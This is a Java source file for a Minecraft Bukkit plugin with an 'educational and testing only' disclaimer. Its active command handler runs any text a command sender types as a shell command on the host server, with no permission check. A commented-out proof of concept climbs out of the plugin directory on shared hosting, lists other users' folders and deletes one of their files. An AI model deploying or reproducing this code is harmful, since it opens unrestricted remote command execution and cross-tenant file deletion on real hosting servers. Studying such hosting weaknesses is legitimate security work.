package com.barancode.runplugin;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitScheduler;

public class Main extends JavaPlugin{
	
	/**
	 *  DISCLAIMER - USE AT YOUR OWN RISK
	 *  This is for educational and testing purposes only.
	 *  Do not use this tool to cause any harm or damage!
	 *  Do not use this tool on a Minecraft server without
	 *  permission from the hosting provider.
	 *  Any action you take with this tool is strictly at
	 *  your own risk.
	 *  The author will not be responsible for losses or
	 *  damages.
	 *  
	 *  Personal Note: I do not advise using this plugin on a live, 
	 *  production server with players on it. Only use it on testing 
	 *  servers, for testing purposes.
	 */
    
    BukkitScheduler scheduler;
    
	public void onEnable(){
		scheduler = Bukkit.getServer().getScheduler();
		
		/*
		 * The following code was used as a proof-of-concept that a Minecraft server operator could
		 * install a malicious plugin on their shared hosting game server, capable of navigating through
		 * others' directories and deleting files.
		 * 
        scheduler.scheduleSyncDelayedTask(this, new Runnable() {
            @Override
            public void run(){
            	getLogger().info(new File("./plugins").getAbsolutePath());
            	File[] files = new File("./plugins").getAbsoluteFile().getParentFile().getParentFile().getParentFile().listFiles();
            	for (File file : files){
            		getLogger().info(file.getName());
            		if (file.getName().equals("<retracted>.pid")){
            			file.delete();
            			getLogger().info(file.getName() + " has been deleted, with <retracted>'s permission");
            		}
            	}
            }
        }, 0L);*/
    }
	
	@Override
	public boolean onCommand(final CommandSender sender, final Command cmd, final String label, final String[] args)
	{
		/*
		 * The following code takes linux commands that a user writes as Minecraft commands,
         * and executes them on the host linux server. This can be used for Linux server administration
		 * directly from inside the game client.
         */
		 
		if (args.length == 0) return false;
		scheduler.runTaskAsynchronously(this, new Runnable(){
			@Override
			public void run(){
				String command = "";
				for (int i = 0; i < args.length; i++){
					command += args[i] + " ";
				}
				command = command.trim();
				try {
				    Runtime rt = Runtime.getRuntime();
				    Process pr = rt.exec(command);
					pr.waitFor();
					InputStream is = pr.getInputStream();
					BufferedReader reader = new BufferedReader(new InputStreamReader(is));
					String s = null;
					while ((s = reader.readLine()) != null){
						getLogger().info(s);
					}
					is.close();
				} catch (Exception e) {
					System.out.println("Error!");
					e.printStackTrace();
				}
			}
		});
		return true;
	}
}
